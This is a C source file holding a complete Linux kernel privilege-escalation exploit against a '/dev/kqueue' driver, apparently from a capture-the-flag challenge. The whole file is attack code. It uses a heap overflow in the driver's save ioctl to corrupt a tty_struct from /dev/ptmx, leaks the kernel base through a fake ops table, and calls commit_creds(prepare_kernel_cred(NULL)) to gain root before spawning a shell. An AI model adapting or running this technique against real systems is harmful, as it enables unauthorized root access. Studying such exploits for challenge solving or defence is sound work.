// musl-gcc -masm=intel -static -o exploit exploit.c

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE

typedef struct{
    uint16_t data_size;
    uint64_t queue_size; /* This needs to handle larger numbers */
    uint32_t max_entries;
    uint16_t idx;
    char* data;
}queue;

typedef struct queue_entry queue_entry;

struct queue_entry{
    uint16_t idx;
    char *data;
    queue_entry *next;
};

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
} request_t;

int fd;

int create_kqueue(uint32_t max_entries, uint16_t data_size) {
    
    request_t request;
    // should be higher than strictly than 0.
    // max number should be 2730
    request.max_entries = max_entries; 
    
    // should be less or equal to 0x20
    request.data_size = data_size;
    
    // Now it will allocate 0x20 + (max_entries+1) * 0x18
    int ret = ioctl(fd, CREATE_KQUEUE, &request);

    return ret;
}

int free_kqueue(uint16_t index) {
    request_t request;

    // the index can be a number from 0..5
    request.queue_idx = index;

    int ret = ioctl(fd, DELETE_KQUEUE, &request);

    return ret;
}

int save_kqueue(uint16_t queue_idx, uint32_t max_entries, uint16_t data_size) {
    request_t request;
    
    // 0..5
    request.queue_idx = queue_idx;

    // should not be higher that kqueue->max_entries
    request.max_entries = max_entries;
    
    // The most important field!
    // should not be higher than queue->queue_size which can give
    // heap overflow.
    request.data_size = data_size;
    
    int ret = ioctl(fd, SAVE, &request);
    
   return ret;
}

int edit(uint16_t queue_idx, uint16_t entry_idx, char *data) {
    request_t request;
    
    //from 0..5
    request.queue_idx = queue_idx;
    
    // The one to change.
    request.entry_idx = entry_idx;
    
    // data to change it to.
    request.data = data;
    
    int ret = ioctl(fd, EDIT_KQUEUE, &request);

    return ret;
    
}

void open_device() {
    fd = open("/dev/kqueue", O_RDONLY);
    assert(fd > 0);
}

#define NOE (0x3f0 - 0x20) / 0x18

struct fake_ptmx {
    uint32_t magic;
    uint32_t kref;
    uint64_t *dev;
    uint64_t *driver;
    uint64_t *ops;
};

void *(*prepare_kernel_cred)(void *) ;
int (*commit_creds)(void *) ;

void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

int dummy_func() {
    asm __volatile__(
            "mov rax, qword ptr [rsp + 0x8];"
            );
}

int main() {
    open_device();    
     
    // queue size will be 0x53*0x18 + 0x20 =  0x7e0
    create_kqueue(NOE, 0x20); // 0 
    create_kqueue(NOE, 0x20); // 1 
    create_kqueue(NOE, 0x20); // 2 

    // in memory
    // 2
    // .
    // .
    // .
    // 1
    // 0
    
    
    struct fake_ptmx fake_p;
    uint64_t tty_operations[0x200];
    
    printf("Dummy func 0x%x\n", dummy_func);
    for(int i=0; i<0x200; i++)
        tty_operations[i] = (uint64_t)&dummy_func;

    fake_p.magic = 0x00005401;
    fake_p.kref = 0x1;
    fake_p.dev = tty_operations;
    fake_p.driver = tty_operations;
    fake_p.ops = tty_operations; 

    for(uint16_t i=0; i<NOE; i++) {
        printf("edit N%x\n", i);
        edit(2, (uint16_t)i, (char*)&fake_p);
    }
    
    free_kqueue(0);
    int ptmx = open("/dev/ptmx", O_RDONLY); // Alloc tty_struct in the place of 0 kqueue.

    free_kqueue(1);
    save_kqueue(2, NOE-0x6, 0x30);

    uint64_t ret = ioctl(ptmx, 0, NULL); 
    printf("%p\n", ret);
    uint64_t kernel_base = ret - 0x49510d;
    printf("%p\n", kernel_base);
    
    commit_creds = kernel_base + 0x8c140;
    prepare_kernel_cred = kernel_base + 0x8c580;
    
    for(int i=0; i<0x200; i++)
        tty_operations[i] = (uint64_t)&get_root;

    ret = ioctl(ptmx, 0, NULL); 
    printf("%p\n", ret);
    
    system("/bin/sh");
    return 0;
}
